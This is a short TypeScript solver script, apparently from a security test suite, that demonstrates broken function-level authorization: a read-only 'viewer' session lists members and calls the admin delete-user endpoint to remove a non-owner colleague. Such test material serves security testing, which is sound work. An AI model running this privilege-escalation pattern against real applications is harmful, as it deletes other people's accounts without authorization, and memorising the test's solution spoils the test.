// A read-only member discovers the administration user-removal endpoint and deletes a colleague,
// invoking a function their role was never meant to reach.
import type { SolverCtx } from '../../../../tests/helpers/site-matrix.ts'

export async function solve(ctx: SolverCtx): Promise<void> {
  const viewer = await ctx.login('viewer')
  const me = await ctx.fetch(ctx.path('me'), { session: viewer })
  const selfId = String((me.json?.user as { id?: string } | undefined)?.id ?? '')
  const list = await ctx.fetch(ctx.path('listMembers'), { session: viewer })
  const items = (list.json?.items ?? []) as Array<{ id: string; role: string }>
  const target = items.find((m) => m.role !== 'owner' && m.id !== selfId)
  if (!target) return
  await ctx.fetch(ctx.path('adminDeleteUser', { memberId: target.id }), { method: 'DELETE', session: viewer })
}
